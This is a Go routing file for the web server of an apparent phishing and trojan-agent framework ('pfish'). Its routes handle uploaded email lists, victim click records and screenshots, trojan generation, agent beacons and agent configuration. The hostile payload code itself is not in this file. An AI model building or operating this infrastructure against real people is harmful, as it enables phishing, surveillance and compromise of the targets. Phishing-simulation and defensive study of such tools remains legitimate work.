package server

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/pow1e/pfish/config"
	"github.com/pow1e/pfish/service"
	"github.com/sirupsen/logrus"
)

func WebServer() {
	// 默认模式，输出日志
	gin.SetMode(gin.ReleaseMode) // 可根据需要选择 Debug 模式或 Release 模式
	router := gin.Default()
	apiGroup := router.Group(config.Conf.Server.Web.Prefix)
	// 身份验证中间件
	apiGroup.Use(func(c *gin.Context) {
		query, b := c.GetQuery("pass")
		if b && query == config.Conf.Server.Pass {
			c.Next()
		} else {
			c.AbortWithStatus(401)
		}
	})

	// /info/:md5 获取截图 根据email的md5获取
	apiGroup.GET("/info/:md5", service.GetMessage)
	// 映射整个文件目录
	apiGroup.Static(config.Conf.Server.Static.WebPath, config.Conf.Server.Static.FilePath)

	// /upload_excel 上传文件 用于解析邮件
	apiGroup.POST("/upload_excel", service.ImportExcel)

	// /export_message?email=xxx 导出邮箱对应的点击信息
	apiGroup.GET("/export_message", service.ExportMessage)

	// /gen 生成木马
	apiGroup.POST("/gen", service.GenerateAgent)

	// /active
	apiGroup.POST("/alive/*md5", service.Alive)

	// agent木马的相关配置 增加配置 删除配置 修改配置
	agentGroup := apiGroup.Group("/agent")
	{
		// /agent/create
		agentGroup.POST("/create_config", service.CreateAgentConfig)

		// /agent/update
		agentGroup.POST("/update_config", service.UpdateAgentConfig)

		// /agent/delete
		agentGroup.DELETE("/del_config", service.DeleteAgentConfig)
	}

	taskGroup := apiGroup.Group("/task")
	{
		taskGroup.POST("/create")
	}

	// 启动 Web 服务器
	logrus.Info("启动web服务成功，此服务用于展示截图")
	if err := router.Run(fmt.Sprintf(":%s", config.Conf.Server.Web.Port)); err != nil {
		logrus.Error("启动web服务失败：", err)
	}
}
